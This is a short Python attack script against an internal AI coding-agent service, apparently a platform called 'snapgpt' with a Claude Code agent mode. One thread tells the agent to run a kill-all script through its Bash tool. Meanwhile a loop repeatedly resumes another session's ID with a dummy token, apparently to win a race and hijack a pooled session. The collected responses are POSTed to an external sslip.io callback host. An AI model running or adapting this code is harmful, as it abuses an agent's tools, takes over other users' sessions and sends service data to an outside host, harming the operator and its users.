import http.client,json,time,threading,urllib.request
D='lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local'
U='snapgpt-basic4-20261105-052555@armorerlabs.com'; OLD='10e0890a7d03'; HOST='https://snapgpt.labs.snaplogicdev.com'
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'attempts':[]}
def post(path,obj,timeout):
 c=http.client.HTTPConnection(D,80,timeout=timeout); raw=json.dumps(obj,separators=(',',':')).encode(); c.request('POST',path,raw,{'Content-Type':'application/json','X-SL-Token':'x'}); r=c.getresponse(); return r.status,r.read().decode('utf-8','replace')
def killer():
 try:
  out['kill']=post('/session/generate',{'user_id':U,'message':'Run python3 /home/worker/killall.py with the Bash tool.','host_url':HOST,'session_id':'','agent_mode':'claude_code'},60)
 except Exception as e: out['kill_error']=repr(e)
t=threading.Thread(target=killer,daemon=True);t.start()
for i in range(60):
 time.sleep(.25)
 rec={'i':i}
 try:
  rec['init']=post('/session/init',{'user_id':U,'host_url':HOST,'project_path':'','project_id':'','force':False,'resume_session_id':OLD},10)
 except Exception as e: rec['init_error']=repr(e)
 out['attempts'].append(rec)
 if rec.get('init') and ('reused":false' in rec['init'][1] or 'pool_claimed' in rec['init'][1]): break
t.join(timeout=1)
raw=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
try:
 q=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-race4-concurrent-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'});urllib.request.urlopen(q,timeout=20).read()
except Exception as e: out['sink_error']=repr(e)
print(json.dumps(out,sort_keys=True))
